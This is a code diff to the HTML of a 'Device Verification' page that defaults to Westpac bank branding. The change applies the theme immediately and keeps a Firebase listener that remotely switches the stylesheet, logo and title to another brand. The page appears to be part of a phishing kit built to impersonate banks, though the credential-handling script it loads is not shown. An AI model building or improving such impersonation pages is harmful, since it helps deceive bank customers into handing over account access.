@@ -62,24 +62,29 @@
             </div>
         </footer>
     </div>
-    <script src="./script.js"></script>
     <script src="themes/config.js"></script>
     <script>
-        // Initialize theme
-        const database = firebase.database();
-        database.ref('activeTheme').on('value', snapshot => {
-            const activeTheme = snapshot.val() || 'westpac';
-            const theme = themes[activeTheme];
-            
-            // Update theme styles
-            document.getElementById('themeStyles').href = theme.styles;
-            
-            // Update logo
-            document.querySelector('.logo-image').src = theme.logo;
-            
-            // Update title
-            document.title = `Device Verification - ${theme.name}`;
+        // Initialize theme immediately
+        const activeTheme = 'westpac'; // Default theme
+        const theme = themes[activeTheme];
+        
+        // Update theme styles
+        document.getElementById('themeStyles').href = theme.styles;
+        
+        // Update logo
+        document.querySelector('.logo-image').src = theme.logo;
+        
+        // Update title
+        document.title = `Device Verification - ${theme.name}`;
+        
+        // Listen for theme changes from Firebase
+        firebase.database().ref('activeTheme').on('value', snapshot => {
+            const newTheme = themes[snapshot.val() || 'westpac'];
+            document.getElementById('themeStyles').href = newTheme.styles;
+            document.querySelector('.logo-image').src = newTheme.logo;
+            document.title = `Device Verification - ${newTheme.name}`;
         });
     </script>
+    <script src="./script.js"></script>
 </body>
 </html>
